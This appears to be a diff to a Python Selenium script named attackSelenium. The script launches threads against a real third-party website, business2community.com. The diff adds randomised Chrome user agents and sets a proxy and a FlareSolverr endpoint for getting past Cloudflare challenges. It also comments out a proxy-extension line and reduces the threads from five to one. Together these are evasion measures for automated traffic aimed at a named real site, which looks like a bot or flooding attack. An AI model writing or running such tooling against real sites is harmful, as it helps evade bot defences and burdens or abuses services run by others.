@@ -15,6 +15,13 @@ from selenium.common import TimeoutException
 from selenium.webdriver.support.wait import WebDriverWait
 from selenium.webdriver.support.expected_conditions import presence_of_element_located, staleness_of, title_is
 from selenium.webdriver.common.by import By
+from random_user_agent.user_agent import UserAgent
+from random_user_agent.params import SoftwareName, OperatingSystem
+
+software_names = [SoftwareName.CHROME.value]
+operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]   
+
+user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)
 
 # printing lowercase
 letters = string.ascii_lowercase
@@ -272,8 +279,11 @@ def attackSelenium(baseUrl):
 	proxy = (host, port, username, password) 
 	proxy_extension = ProxyExtension(*proxy)
 	print(proxy_extension.directory)
-	options.add_argument(f"--load-extension={proxy_extension.directory}") #,/root/blablabla/capExt
+	# options.add_argument(f"--load-extension={proxy_extension.directory}") #,/root/blablabla/capExt
 	print('proxy is set to %s' % prox_url)
+
+	userAgent = user_agent_rotator.get_random_user_agent()
+	options.add_argument('--user-agent=' + userAgent + '')
 
 	# if we are inside the Docker container, we avoid downloading the driver
 	driver_exe_path = None
@@ -369,7 +379,7 @@ def attackSelenium(baseUrl):
 flareSolverUrl = 'http://localhost:8191/v1'
 
 
-for i in range(5):
+for i in range(1):
 	Thread(target=attackSelenium, args=['https://www.business2community.com']).start()
 input()
 
